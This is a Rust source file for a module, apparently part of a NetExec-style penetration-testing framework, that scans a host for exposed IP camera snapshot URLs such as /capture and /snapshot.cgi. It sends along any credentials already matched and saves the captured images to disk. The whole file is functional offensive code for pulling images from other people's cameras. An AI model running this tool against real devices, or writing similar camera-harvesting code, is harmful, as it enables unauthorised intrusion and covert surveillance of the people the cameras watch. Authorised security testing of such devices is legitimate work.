//! # IoT Camera Module
//!
//! Hunts for exposed IP camera endpoints, particularly targeting ESP32-Cam setups
//! like the ones found in `rusty-secure` and generic unauthenticated snapshot URLs.
//! Saves extracted images locally.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_protocols::{http::HttpSession, NxcSession};
use serde_json::json;
use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use std::time::{SystemTime, UNIX_EPOCH};

pub struct IotCam {}

impl IotCam {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for IotCam {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for IotCam {
    fn name(&self) -> &'static str {
        "iot_cam"
    }

    fn description(&self) -> &'static str {
        "Hunts for exposed IoT webcams (rusty-secure, ESP32, IPCam) and extracts snapshots locally."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["http"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![]
    }

    async fn run(&self, session: &mut dyn NxcSession, _opts: &ModuleOptions) -> Result<ModuleResult> {
        let http_sess = session
            .as_any_mut()
            .downcast_mut::<HttpSession>()
            .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;

        let scheme = "http"; // In a full implementation, detect if parsing from port 443
        let base_url = format!("{}://{}:{}", scheme, http_sess.target, http_sess.port);
        
        println!("[*] (HTTP API) Probing {} for exposed camera endpoints...", base_url);

        // Common image extraction targets for rusty-secure/esp32/generic IP cams
        let endpoints = vec![
            "/capture", 
            "/image", 
            "/jpg", 
            "/snapshot.cgi", 
            "/api/picture",
            "/cam-hi.jpg"
        ];
        
        let mut hit_endpoint = None;
        let mut image_bytes = bytes::Bytes::new();
        
        // Iterating through targets
        for ep in endpoints {
            let target_url = format!("{}{}", base_url, ep);
            let mut req = http_sess.client.get(&target_url);
            
            // Bring along credentials if they were matched natively by the engine initially
            if let Some(creds) = &http_sess.credentials {
                if let Some(password) = &creds.password {
                    req = req.basic_auth(&creds.username, Some(password));
                } else {
                    req = req.basic_auth(&creds.username, None::<&str>);
                }
            }

            if let Ok(resp) = req.send().await {
                if resp.status().is_success() {
                    let content_type = resp
                        .headers()
                        .get("Content-Type")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");
                        
                    // Make sure it's actually an image
                    if content_type.starts_with("image/") {
                        image_bytes = resp.bytes().await?;
                        hit_endpoint = Some(target_url);
                        break;
                    }
                }
            }
        }
        
        let target_url = match hit_endpoint {
            Some(ep) => ep,
            None => {
                return Ok(ModuleResult {
                    success: false,
                    output: "No exposed camera snapshot endpoints found.".to_string(),
                    data: json!({}),
                })
            }
        };

        // We got an image. Save it to disk locally
        let epoch = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
        let file_name = format!("{}_{}_snapshot.jpg", http_sess.target, epoch);
        
        std::fs::write(&file_name, &image_bytes)?;
        
        let success_msg = format!("Extracted snapshot from {} (Saved securely locally to: {})", target_url, file_name);

        Ok(ModuleResult {
            success: true,
            output: success_msg,
            data: json!({
                "camera_endpoint": target_url,
                "saved_file": file_name,
                "bytes": image_bytes.len()
            }),
        })
    }
}
